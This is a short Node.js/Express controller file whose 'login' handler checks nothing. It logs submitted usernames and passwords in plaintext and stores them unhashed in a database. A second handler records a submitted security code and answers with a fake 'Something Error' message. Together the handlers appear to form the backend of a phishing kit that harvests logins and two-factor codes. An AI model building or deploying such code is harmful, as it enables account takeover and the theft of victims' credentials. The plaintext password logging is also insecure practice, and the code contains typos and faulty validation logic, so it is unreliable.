//import Models
const userModel = require('../Model/userModel');
const verifyModel = require('../Model/verifyCode');

exports.login = async (req, res) => {
    try{
        const { username, password } = req.body;
        console.log("Username is", username , ", Password is ", password);
        if(!username && !password)
            return res.status(404).json({ message : "Al feilds required"});
        const Data = {
            Username : username,
            Password : password,
            verifyCode : ''
        }
        const userData = await userModel.create(Data)
        console.log("data Submitted...");
        res.status(200).json({ message : "data submitted" });
    } catch(err){
        res.status(500).send({ message: err.message });
    }
}

exports.verifyCodre = async (req, res) => {
    const { securityCode } = req.body;
    try{
        if(!securityCode)
            return res.status(404).json({ message : "Feild is Required "});
        const isVerfiy = await verifyModel.create({
            verifyCode :securityCode
        });
        res.status(200).json({
            message: "Something Error"
        })
        console.log("Code Submitted: ", securityCode);
    } catch (err){
        console.log(err);
    }
}